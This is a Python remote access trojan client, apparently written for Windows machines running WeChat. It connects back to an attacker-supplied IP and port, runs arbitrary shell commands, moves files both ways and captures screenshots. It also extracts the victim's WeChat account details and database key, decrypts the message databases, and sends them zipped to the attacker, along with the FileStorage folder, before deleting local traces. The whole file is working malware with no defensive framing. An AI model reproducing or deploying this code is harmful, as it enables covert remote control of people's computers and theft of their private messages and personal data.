import socket
import os
import struct
import json
import time
import zipfile
import shutil
from PIL import ImageGrab
from pathlib import Path
from pywxdump import *

ip = "YOUR_IP"
port = 8888


def get_file(conn, file_name):
    if os.path.isfile(file_name):
        conn.send(b'file_exist')
        rev = conn.recv(1024)
        if rev != b'start':
            return
        file_size = os.path.getsize(file_name)
        header = {
            'file_name': file_name,
            'file_size': file_size
        }
        header_json = json.dumps(header)
        header_bytes = header_json.encode('UTF-8')
        header_size = struct.pack('i', len(header_bytes))
        conn.send(header_size)
        rev = conn.recv(1024)
        if rev != b'size_ok':
            return
        conn.send(header_bytes)
        rev = conn.recv(1024)
        if rev == b'header_ok':
            try:
                with open(file_name, 'rb') as f:
                    while file_size > 0:
                        content = f.read(1024)
                        file_size -= len(content)
                        conn.send(content)
            except Exception as e:
                print(f"发送错误: {e}")
                conn.send(b'')
    else:
        conn.send(b'file_not_exist')


def put_file(conn):
    conn.send(b'put')
    rev = conn.recv(1024)
    if rev == b'file_not_exist':
        return
    conn.send(b'start')
    try:
        rev = conn.recv(4)
        header_size = struct.unpack('i', rev)[0]
    except (struct.error, ConnectionResetError):
        print("在接收文件头部长度时发送错误")
        return
    conn.send(b'size_ok')
    header_bytes = conn.recv(header_size).decode('UTF-8')
    header = json.loads(header_bytes)
    file_name = header['file_name']
    file_size = header['file_size']
    conn.send(b'header_ok')
    try:
        with open(file_name, 'wb') as f:
            while file_size > 0:
                content = conn.recv(1024)
                file_size -= len(content)
                f.write(content)
    except IOError as e:
        print(f"在写入文件时发送错误: {e}")
        return


def run_cmd(socker_client, cmd):
    pwd = os.getcwd()
    if cmd.startswith('cd'):
        try:
            os.chdir(cmd.split()[1])
        except FileNotFoundError:
            os.chdir(pwd)
            result = '目录不存在'
            socker_client.send(result.encode('UTF-8'))
            return
        result = '切换目录成功'
        socker_client.send(result.encode('UTF-8'))
        return
    # 执行命令
    try:
        result = os.popen(cmd).read()
    except Exception as e:
        result = f'发生错误：{e}'
    if result == '':
        result = '命令执行成功'
    # 把命令回显结果发送给服务端
    socker_client.send(result.encode('UTF-8'))


def screen_shot(conn):
    conn.send(b'screen')
    rev = conn.recv(1024)
    if rev != b'start':
        return
    # 截图并发生到服务端
    im = ImageGrab.grab()
    # 截屏命名为当前时间
    file_name = time.strftime("%Y-%m-%d %H-%M-%S", time.localtime()) + '.png'
    im.save(file_name)
    get_file(conn, file_name)
    # 删除本地截图
    os.remove(file_name)


def zip_dir(dir_path, zip_file_name):
    # 压缩文件
    zip_file = zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED)
    # 压缩指定文件夹
    pre_len = len(os.path.dirname(dir_path))
    for parent, dir_names, file_names in os.walk(dir_path):
        for file_name in file_names:
            file_path = os.path.join(parent, file_name)
            arc_name = file_path[pre_len:].strip(os.path.sep)  # 相对路径
            zip_file.write(file_path, arc_name)
    zip_file.close()


def get_wechat_info(conn):
    # 读取文件中的json数据
    with open('version_list.json', 'r', encoding='UTF-8') as f:
        version_list = json.load(f)
    # 读取微信信息
    wx_info = read_info(version_list, False)
    if str(wx_info).startswith('[-]'):
        conn.send(wx_info.encode('UTF-8'))
        return None, None
    pid = wx_info[0]['pid']
    version = wx_info[0]['version']
    account = wx_info[0]['account']
    mobile = wx_info[0]['mobile']
    name = wx_info[0]['name']
    mail = wx_info[0]['mail']
    wxid = wx_info[0]['wxid']
    file_path = wx_info[0]['filePath']
    key = wx_info[0]['key']
    wechat_files = str(Path(file_path).parent)
    content = f"""
    ================== wechat info ==================
    [+] 进程号: {pid}
    [+] 版本: {version}
    [+] 微信号: {account}
    [+] 手机号: {mobile}
    [+] 微信名: {name}
    [+] 邮箱: {mail}
    [+] 微信数据路径: {file_path}
    [+] wxid: {wxid}
    [+] key: {key}
    ================== wechat info ==================
    """
    conn.send(content.encode('UTF-8'))
    return file_path, key


def get_wechat(conn):
    file_path, key = get_wechat_info(conn)
    if file_path is None:
        return
    # 获取解密后的数据库路径
    decrypted_path = conn.recv(1024).decode("UTF-8")
    # 创建解密后的数据库文件夹
    if not os.path.exists(decrypted_path):
        os.mkdir(decrypted_path)
    # 解密微信数据库
    args = {
        "mode": "decrypt",
        "key": key,  # 密钥
        "db_path": file_path + '\\Msg',  # 数据库路径
        "out_path": decrypted_path  # 输出路径（必须是目录）
    }
    batch_decrypt(args["key"], args["db_path"], args["out_path"], False)
    # 打包压缩解密后的数据库并发送到服务端
    zip_file_path = decrypted_path + '.zip'
    zip_file_name = Path(zip_file_path).name
    if os.path.exists(zip_file_path):
        os.remove(zip_file_path)
    zip_dir(decrypted_path, zip_file_path)
    pwd = os.getcwd()  # 记录当前路径
    os.chdir(str(Path(decrypted_path).parent))  # 切换到父目录
    get_file(conn, str(zip_file_name))
    os.remove(zip_file_path)  # 删除压缩包
    shutil.rmtree(decrypted_path)  # 删除解密后的数据库文件夹
    os.chdir(pwd)  # 切换回原路径
    rev = conn.recv(1024)  # 接收服务端的确认信息
    if rev != b'get_db_ok':
        return
    # 打包压缩FileStorage文件夹并发送到服务端
    file_storage_path = file_path + "\\FileStorage"
    zip_file_path = file_storage_path + '.zip'
    zip_file_name = Path(zip_file_path).name
    if os.path.exists(zip_file_path):
        os.remove(zip_file_path)
    zip_dir(file_storage_path, zip_file_path)
    pwd = os.getcwd()  # 记录当前路径
    os.chdir(file_path)  # 切换到父目录
    get_file(conn, str(zip_file_name))
    os.remove(zip_file_path)  # 删除压缩包
    os.chdir(pwd)  # 切换回原路径


def main():
    global socker_client
    while True:
        try:
            socker_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socker_client.connect((ip, port))
        except socket.error as e:
            continue
        # print('连接到服务器')
        while True:
            try:
                data = socker_client.recv(1024).decode("UTF-8")
            except socket.error as e:
                print(f"发生错误: {e}")
                break
            if not data:
                break
            command = data.split()
            if data == 'exit':
                break
            elif command[0] == 'put':
                put_file(socker_client)
            elif command[0] == 'get':
                file_name = data.split()[1]
                get_file(socker_client, file_name)
            elif data == 'screen':
                screen_shot(socker_client)
            elif data == 'wxinfo':
                get_wechat_info(socker_client)
            elif data == 'wxchat':
                get_wechat(socker_client)
            else:
                run_cmd(socker_client, data)
        socker_client.close()


if __name__ == '__main__':
    main()
